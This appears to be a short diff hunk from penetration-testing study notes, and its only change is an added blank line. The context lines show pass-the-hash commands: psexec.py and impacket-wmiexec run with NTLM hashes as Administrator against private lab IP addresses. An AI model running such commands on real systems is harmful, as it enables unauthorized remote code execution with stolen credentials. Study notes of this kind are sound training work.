@@ -144,6 +144,7 @@ psexec.py "frank castle":@192.168.57.141 -hashes aad3b435b51404eeaad3b435b51404e
 
 
 - using wmiexec on kali
+  
          kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
 
 
